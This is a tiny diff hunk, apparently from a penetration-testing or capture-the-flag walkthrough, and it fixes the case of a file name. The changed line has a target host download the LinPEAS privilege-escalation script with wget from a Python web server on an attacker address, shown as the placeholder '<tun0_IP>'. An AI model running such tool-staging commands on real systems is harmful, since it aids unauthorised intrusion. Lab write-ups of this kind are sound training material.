@@ -864,7 +864,7 @@ python3 -m http.server 8888
 on server:
 
 ```
-wget http://<tun0_IP>:8888/Linpeas.sh
+wget http://<tun0_IP>:8888/linpeas.sh
 ```
 
 
